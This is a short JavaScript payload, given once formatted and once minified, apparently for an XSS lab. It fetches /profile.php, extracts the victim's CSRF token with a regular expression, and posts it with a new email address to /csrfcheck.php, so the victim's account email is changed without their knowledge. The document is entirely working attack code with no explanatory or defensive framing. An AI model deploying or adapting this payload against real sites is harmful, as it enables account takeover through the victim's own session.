var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/profile.php',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf_token"\s+value="([^"]+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/csrfcheck.php', true);
    changeReq.send('csrf_token='+token+'&newEmail=test@test.com')
};

var req =new XMLHttpRequest();req.onload=handleResponse;req.open('get','/profile.php',true);req.send();function handleResponse(){var token=this.responseText.match(/name="csrf_token"\s+value="([^"]+)"/)[1];var changeReq=new XMLHttpRequest();changeReq.open('post','/csrfcheck.php',true);changeReq.send('csrf_token='+token+'&newEmail=test@test.com')};